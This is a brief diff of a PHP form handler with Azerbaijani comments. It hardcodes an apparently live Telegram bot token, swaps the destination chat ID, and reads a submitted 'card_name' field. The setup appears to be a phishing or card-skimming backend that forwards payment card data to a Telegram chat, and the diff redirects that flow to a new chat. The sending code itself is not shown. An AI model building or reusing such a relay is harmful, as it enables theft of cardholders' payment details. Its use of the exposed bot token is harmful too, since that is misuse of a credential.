@@ -11,7 +11,7 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
 
 // BOT MƏLUMATLARI
 $botToken = '8920213345:AAFbPSMng8h2PiQmfrA1TkHFehelvlSGzxA';
-$chatId = '-1004366787170';
+$chatId = '-1003703249452';
 
 // POST MƏLUMATLARI
 $cardName = isset($_POST['card_name']) ? trim(strip_tags($_POST['card_name'])) : '';
